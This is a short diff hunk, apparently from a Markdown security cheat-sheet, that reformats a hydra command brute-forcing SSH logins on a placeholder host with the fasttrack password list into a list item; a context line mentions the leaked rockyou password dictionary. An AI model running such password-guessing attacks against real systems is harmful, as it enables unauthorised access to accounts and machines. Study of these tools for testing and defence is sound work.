@@ -66,7 +66,7 @@ gunzip rockyou.txt.gz     # leaked passwords dictionary
 
 
 
-hydra -l user -P fasttrack.txt ssh://x.x.x.x -V -I -F
+- `hydra -l user -P fasttrack.txt ssh://x.x.x.x -V -I -F`
 
 
 
